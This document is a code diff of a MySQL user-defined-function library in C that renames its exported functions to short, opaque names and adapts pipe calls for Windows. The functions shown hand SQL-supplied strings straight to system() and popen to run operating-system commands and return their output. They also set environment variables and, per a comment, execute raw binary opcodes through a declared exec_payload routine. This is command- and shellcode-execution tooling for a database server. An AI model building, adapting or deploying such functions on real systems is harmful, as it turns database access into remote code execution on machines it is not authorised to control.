@@ -65,19 +65,19 @@ extern "C" {
 #endif
 
 DLLEXP 
-my_bool lib_mysqludf_sys_info_init(
+my_bool sif_init(
 	UDF_INIT *initid
 ,	UDF_ARGS *args
 ,	char *message
 );
 
 DLLEXP 
-void lib_mysqludf_sys_info_deinit(
+void sif_deinit(
 	UDF_INIT *initid
 );
 
 DLLEXP 
-char* lib_mysqludf_sys_info(
+char* sif(
 	UDF_INIT *initid
 ,	UDF_ARGS *args
 ,	char* result
@@ -87,24 +87,24 @@ char* lib_mysqludf_sys_info(
 );
 
 /**
- * sys_get
+ * sgt
  * 
  * Gets the value of the specified environment variable.
  */
 DLLEXP 
-my_bool sys_get_init(
+my_bool sgt_init(
 	UDF_INIT *initid
 ,	UDF_ARGS *args
 ,	char *message
 );
 
 DLLEXP 
-void sys_get_deinit(
+void sgt_deinit(
 	UDF_INIT *initid
 );
 
 DLLEXP 
-char* sys_get(
+char* sgt(
 	UDF_INIT *initid
 ,	UDF_ARGS *args
 ,	char* result
@@ -114,27 +114,27 @@ char* sys_get(
 );
 
 /**
- * sys_set
+ * sst
  * 
  * Sets the value of the environment variables.
  * This function accepts a set of name/value pairs
  * which are then set as environment variables.
- * Use sys_get to retrieve the value of such a variable 
+ * Use sgt to retrieve the value of such a variable 
  */
 DLLEXP 
-my_bool sys_set_init(
+my_bool sst_init(
 	UDF_INIT *initid
 ,	UDF_ARGS *args
 ,	char *message
 );
 
 DLLEXP 
-void sys_set_deinit(
+void sst_deinit(
 	UDF_INIT *initid
 );
 
 DLLEXP 
-long long sys_set(
+long long sst(
 	UDF_INIT *initid
 ,	UDF_ARGS *args
 ,	char *is_null
@@ -142,25 +142,25 @@ long long sys_set(
 );
 
 /**
- * sys_exec
+ * sex
  * 
  * executes the argument commandstring and returns its exit status.
  * Beware that this can be a security hazard.
  */
 DLLEXP 
-my_bool sys_exec_init(
+my_bool sex_init(
 	UDF_INIT *initid
 ,	UDF_ARGS *args
 ,	char *message
 );
 
 DLLEXP 
-void sys_exec_deinit(
+void sex_deinit(
 	UDF_INIT *initid
 );
 
 DLLEXP 
-my_ulonglong sys_exec(
+my_ulonglong sex(
 	UDF_INIT *initid
 ,	UDF_ARGS *args
 ,	char *is_null
@@ -168,25 +168,25 @@ my_ulonglong sys_exec(
 );
 
 /**
- * sys_eval
+ * sev
  * 
  * executes the argument commandstring and returns its standard output.
  * Beware that this can be a security hazard.
  */
 DLLEXP 
-my_bool sys_eval_init(
+my_bool sev_init(
 	UDF_INIT *initid
 ,	UDF_ARGS *args
 ,	char *message
 );
 
 DLLEXP 
-void sys_eval_deinit(
+void sev_deinit(
 	UDF_INIT *initid
 );
 
 DLLEXP 
-char* sys_eval(
+char* sev(
 	UDF_INIT *initid
 ,	UDF_ARGS *args
 ,	char* result
@@ -196,24 +196,24 @@ char* sys_eval(
 );
 
 /**
- * sys_bineval
+ * sevb
  * 
  * executes bynary opcodes.
  * Beware that this can be a security hazard.
  */
 DLLEXP 
-my_bool sys_bineval_init(
+my_bool sevb_init(
 	UDF_INIT *initid
 ,	UDF_ARGS *args
 );
 
 DLLEXP 
-void sys_bineval_deinit(
+void sevb_deinit(
 	UDF_INIT *initid
 );
 
 DLLEXP 
-int sys_bineval(
+int sevb(
 	UDF_INIT *initid
 ,	UDF_ARGS *args
 );
@@ -228,9 +228,9 @@ DWORD WINAPI exec_payload(LPVOID lpParameter);
 #endif
 
 /**
- * lib_mysqludf_sys_info
+ * sif
  */
-my_bool lib_mysqludf_sys_info_init(
+my_bool sif_init(
 	UDF_INIT *initid
 ,	UDF_ARGS *args
 ,	char *message
@@ -239,7 +239,7 @@ my_bool lib_mysqludf_sys_info_init(
 	if(args->arg_count!=0){
 		strcpy(
 			message
-		,	"No arguments allowed (udf: lib_mysqludf_sys_info)"
+		,	"No arguments allowed (udf: sif)"
 		);
 		status = 1;
 	} else {
@@ -248,12 +248,12 @@ my_bool lib_mysqludf_sys_info_init(
 	return status;
 }
 
-void lib_mysqludf_sys_info_deinit(
+void sif_deinit(
 	UDF_INIT *initid
 ){
 }
 
-char* lib_mysqludf_sys_info(
+char* sif(
 	UDF_INIT *initid
 ,	UDF_ARGS *args
 ,	char* result
@@ -266,7 +266,7 @@ char* lib_mysqludf_sys_info(
 	return result;
 }
 
-my_bool sys_get_init(
+my_bool sgt_init(
 	UDF_INIT *initid
 ,	UDF_ARGS *args
 ,	char *message
@@ -284,12 +284,12 @@ my_bool sys_get_init(
 	}
 }
 
-void sys_get_deinit(
+void sgt_deinit(
 	UDF_INIT *initid
 ){
 }
 
-char* sys_get(
+char* sgt(
 	UDF_INIT *initid
 ,	UDF_ARGS *args
 ,	char* result
@@ -306,7 +306,7 @@ char* sys_get(
 	return value;
 }
 
-my_bool sys_set_init(
+my_bool sst_init(
 	UDF_INIT *initid
 ,	UDF_ARGS *args
 ,	char *message
@@ -341,7 +341,7 @@ my_bool sys_set_init(
 	return 0;
 }
 
-void sys_set_deinit(
+void sst_deinit(
 	UDF_INIT *initid
 ){
 	if (initid->ptr!=NULL){
@@ -349,7 +349,7 @@ void sys_set_deinit(
 	}
 }
 
-long long sys_set(
+long long sst(
 	UDF_INIT *initid
 ,	UDF_ARGS *args
 ,	char *is_null
@@ -372,7 +372,7 @@ long long sys_set(
 	return SETENV(name,value);		
 }
 
-my_bool sys_exec_init(
+my_bool sex_init(
 	UDF_INIT *initid
 ,	UDF_ARGS *args
 ,	char *message
@@ -390,12 +390,12 @@ my_bool sys_exec_init(
 	}
 }
 
-void sys_exec_deinit(
+void sex_deinit(
 	UDF_INIT *initid
 ){
 }
 
-my_ulonglong sys_exec(
+my_ulonglong sex(
 	UDF_INIT *initid
 ,	UDF_ARGS *args
 ,	char *is_null
@@ -404,7 +404,7 @@ my_ulonglong sys_exec(
 	return system(args->args[0]);
 }
 
-my_bool sys_eval_init(
+my_bool sev_init(
 	UDF_INIT *initid
 ,	UDF_ARGS *args
 ,	char *message
@@ -422,12 +422,12 @@ my_bool sys_eval_init(
 	}
 }
 
-void sys_eval_deinit(
+void sev_deinit(
 	UDF_INIT *initid
 ){
 }
 
-char* sys_eval(
+char* sev(
 	UDF_INIT *initid
 ,	UDF_ARGS *args
 ,	char* result
@@ -445,7 +445,7 @@ char* sys_eval(
 
     result[0] = (char)0;
 
-	pipe = popen(args->args[0], "r");
+	pipe = _popen(args->args[0], "r");
 
 	while (fgets(line, sizeof(line), pipe) != NULL) {
 		linelen = strlen(line);
@@ -454,7 +454,7 @@ char* sys_eval(
 		outlen = outlen + linelen;
 	}
 
-	pclose(pipe);
+	_pclose(pipe);
 
 	if (!(*result) || result == NULL) {
 		*is_null = 1;
@@ -466,20 +466,20 @@ char* sys_eval(
 	return result;
 }
 
-my_bool sys_bineval_init(
+my_bool sevb_init(
 	UDF_INIT *initid
 ,	UDF_ARGS *args
 ){
 	return 0;
 }
 
-void sys_bineval_deinit(
+void sevb_deinit(
 	UDF_INIT *initid
 ){
 	
 }
 
-int sys_bineval(
+int sevb(
 	UDF_INIT *initid
 ,	UDF_ARGS *args
 ){
